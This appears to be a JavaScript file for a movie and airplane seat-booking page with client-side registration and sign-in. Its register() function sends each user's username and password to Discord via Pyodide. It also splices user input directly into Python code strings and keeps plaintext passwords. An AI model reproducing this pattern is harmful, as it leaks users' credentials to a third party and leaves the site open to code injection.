let selectedSystem = ''; // Current booking system (movie or airplane)
let currentUser = null;
let pyodide;
let registeredUsers = [];

async function loadPyodideAndPackages() {
    pyodide = await loadPyodide();
    await pyodide.loadPackage('micropip');
    await pyodide.runPythonAsync(`
        import micropip
        await micropip.install(['requests', 'cryptography', 'discord-webhook'])
    `);
    console.log('Pyodide and packages loaded!');
}

// Function to switch between booking systems
function selectBookingSystem(system) {
    selectedSystem = system;
    document.getElementById('menuSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('bookingTitle').textContent = system === 'movie' ? 'Movie Seat Booking' : 'Airplane Seat Booking';

    // Remove the existing script tag if present
    const existingScript = document.getElementById('bookingScript');
    if (existingScript) {
        document.body.removeChild(existingScript);
    }

    // Dynamically load the appropriate script for the selected system
    const script = document.createElement('script');
    script.src = `JS/${system}SeatBooking.js`;
    script.id = 'bookingScript';
    script.onload = () => {
        // Call generateSeatMap once the script has loaded
        generateSeatMap();
    };
    document.body.appendChild(script);
}

// Authentication functions (same for both systems)
async function register() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (registeredUsers.find(user => user.username === username)) {
        alert("Username is already registered!");
        return;
    }

    const userData = { username, password };
    registeredUsers.push(userData);

    const encryptedData = await pyodide.runPythonAsync(`encrypt_data(${JSON.stringify(userData)})`);
    const filename = `upload-${Date.now()}.json`;
    const jsonLink = await pyodide.runPythonAsync(`send_to_discord(${JSON.stringify(encryptedData)}, "${filename}")`);

    if (jsonLink) {
        alert("Registration successful! Please sign in.");
    } else {
        alert("Failed to send data to Discord.");
    }
}

async function signIn() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const user = registeredUsers.find(user => user.username === username && user.password === password);
    if (user) {
        currentUser = username;
        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('bookingSection').classList.remove('hidden');
    } else {
        alert('Sign in failed. Please try again.');
    }
}
